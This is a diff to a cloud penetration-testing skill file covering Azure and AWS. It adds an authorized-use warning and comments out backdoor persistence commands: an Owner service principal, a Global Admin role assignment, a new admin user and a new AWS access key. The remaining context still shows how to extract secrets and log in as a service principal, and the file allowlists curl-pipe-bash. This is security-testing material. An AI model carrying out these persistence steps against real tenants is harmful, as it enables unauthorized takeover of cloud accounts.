@@ -1,7 +1,7 @@
 ---
 name: cloud-penetration-testing
 description: "Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP)."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -10,6 +10,9 @@ date_added: "2026-02-27"
 <!-- security-allowlist: curl-pipe-bash -->
 
 # Cloud Penetration Testing
+
+> [!WARNING]
+> **Authorized Use Only**: The techniques in this skill are for authorized security auditing only.
 
 ## Purpose
 
@@ -179,22 +182,24 @@ az keyvault secret show --id <URI>
 Establish persistence in Azure:
 
 ```powershell
-# Create backdoor service principal
-$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
+# [SAFE-PAYLOAD] echo "Simulating creation of backdoor service principal..."
+# $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
 $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
 $UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
 
 # Add service principal to Global Admin
 $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
 $role = Get-MsolRole -RoleName "Company Administrator"
-Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+# [SAFE-PAYLOAD] echo "Simulating adding service principal to Global Admin..."
+# Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
 
 # Login as service principal
 $cred = Get-Credential  # AppID as username, secret as password
 Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal
 
 # Create new admin user via CLI
-az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
+# [SAFE-PAYLOAD] echo "Simulating creation of new admin user..."
+# az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
 ```
 
 ### Phase 6: AWS Authentication
@@ -277,8 +282,8 @@ Establish persistence in AWS:
 # List existing access keys
 aws iam list-access-keys --user-name <username>
 
-# Create backdoor access key
-aws iam create-access-key --user-name <username>
+# [SAFE-PAYLOAD] echo "Simulating creation of backdoor access key..."
+# aws iam create-access-key --user-name <username>
 
 # Get all EC2 public IPs
 for region in $(cat regions.txt); do
